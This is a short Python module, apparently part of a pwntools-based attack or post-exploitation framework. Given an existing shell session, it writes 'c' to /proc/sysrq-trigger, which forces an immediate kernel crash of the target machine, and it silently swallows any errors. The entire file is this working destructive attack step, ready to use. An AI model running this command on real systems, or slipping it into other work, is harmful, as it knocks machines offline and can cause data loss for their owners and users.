#!/usr/bin/python3

from pwn import *
import misc.coloredstatus as cs
from time import sleep
import os

def execute(session, configs, params):
    
    try:
        shell = session.shell("/bin/bash")
        shell.sendline("echo c > /proc/sysrq-trigger")
        output = str(shell.recvrepeat(0.2), "UTF-8")
        shell.close()
        return 0
    except:
        return 2
